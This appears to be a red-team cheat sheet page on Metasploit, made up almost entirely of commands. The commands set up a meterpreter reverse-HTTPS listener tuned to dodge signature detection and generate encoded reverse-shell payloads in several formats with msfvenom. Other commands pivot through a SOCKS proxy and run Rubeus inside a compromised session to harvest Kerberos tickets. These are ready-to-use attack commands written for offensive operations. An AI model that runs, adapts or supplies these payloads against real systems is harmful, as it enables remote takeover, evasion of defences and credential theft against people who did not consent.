---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/resource-development/metasploit
---

# Metasploit

We cannot simply use the default setup listener in Metasploit since it will be flagged by signature base.&#x20;

When using HTTPS encryption, Metasploit will use its own certificate.

### Generate Certificate

```bash
└─$ openssl req -new -x509 -nodes -out cert.crt -keyout priv.key -newkey rsa:4096 -days 365

└─$ cat cert.crt priv.key > cert.pem
```

### Listener

```ruby
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 10.10.10.10
msf6 exploit(multi/handler) > set lport 443
msf6 exploit(multi/handler) > set exitfunc thread
msf6 exploit(multi/handler) > set HttpUserAgent Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
msf6 exploit(multi/handler) > set StagerVerifySSLCert true
msf6 exploit(multi/handler) > set HandlerSSLCert /home/kali/Payload/cert.pem
msf6 exploit(multi/handler) > set OverrideLHOST ec2-10.10.10.10.ap-southeast-1.compute.amazonaws.com
msf6 exploit(multi/handler) > set OverrideLPORT 443
msf6 exploit(multi/handler) > set OverrideRequestHost true
msf6 exploit(multi/handler) > setg ReverseAllowProxy true
msf6 exploit(multi/handler) > exploit

# Encoded in used
msf6 exploit(multi/handler) > set EnableStageEncoding true
msf6 exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
```

### Shellcode Generate

```ruby
# RAW
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -f raw > shellcode.bin

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 EXITFUNC=thread -f ps1

# ASPX
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -f aspx > met.aspx

# CSharp
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -f csharp

# VBA
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 EXITFUNC=thread -f vbapplication

# Encoded
msfvenom -p windows/meterpreter/reverse_https LHOST=eth0 LPORT=443 -e x86/shikata_ga_nai -f exe -o file_shikata.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -e x64/zutto_dekiru -f exe -o file_zutto.exe
```

### Proxy

```ruby
meterpreter > run autoroute -s target-network/24
msf6 > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set srvhost 127.0.0.1
msf6 > set srvport 9050
msf6 > set version 4a
msf6 > exploit -j

msf6 > background
msf6 > use multi/manage/autoroute
msf6 > set session 1
msf6 > exploit
msf6 > use auxiliary/server/socks_proxy
msf6 > set srvhost 127.0.0.1
msf6 > set srvport 9050
msf6 > set version 4a
msf6 > exploit -j
```

### Execute-Assembly

```ruby
msf6 > use post/windows/manage/execute_dotnet_assembly
msf6 > post(windows/manage/execute_dotnet_assembly) > set DOTNET_EXE /home/kali/Tools/Rubues.exe
msf6 > post(windows/manage/execute_dotnet_assembly) > set ARGUMENTS "triage"
msf6 > post(windows/manage/execute_dotnet_assembly) > set SESSION 1
msf6 > post(windows/manage/execute_dotnet_assembly) > run
```
